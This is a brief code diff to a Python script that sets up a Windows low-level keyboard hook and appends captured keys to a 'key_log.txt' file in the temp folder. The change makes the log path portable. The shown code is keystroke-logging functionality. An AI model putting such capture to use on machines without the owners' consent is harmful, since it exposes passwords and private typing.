@@ -4,6 +4,7 @@ Writes to file with line buffering so we can monitor in real time.
 """
 import ctypes
 import ctypes.wintypes as wt
+import os
 import sys
 import time
 from datetime import datetime
@@ -30,7 +31,11 @@ class MSG(ctypes.Structure):
 
 LOW_LEVEL_KB_PROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wt.WPARAM, wt.LPARAM)
 
-LOG = open(r"C:\Users\1\AppData\Local\Temp\key_log.txt", "a", buffering=1)
+LOG_PATH = os.environ.get("TEMP", "/tmp")
+if not LOG_PATH.endswith(os.sep):
+    LOG_PATH += os.sep
+LOG_PATH += "key_log.txt"
+LOG = open(LOG_PATH, "a", buffering=1)
 LOG.write(f"\n=== Session start {datetime.now().isoformat()} ===\n")
 
 VK_NAMES = {
